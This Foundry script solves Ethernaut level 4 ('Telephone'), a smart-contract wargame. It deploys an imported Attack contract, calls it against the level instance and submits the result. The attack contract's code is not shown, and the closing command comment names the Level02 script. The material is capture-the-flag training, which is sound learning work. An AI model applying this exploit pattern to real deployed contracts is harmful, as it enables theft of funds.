// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Telephone} from "../src/Level04.sol";
import {Attack} from "../src/Level04Attack.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";

contract Level04 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        Telephone instance = Telephone(vm.envAddress("LVL04_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();
        attack.atatatak(address(instance));

        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level02.s.sol --broadcast --rpc-url sepolia
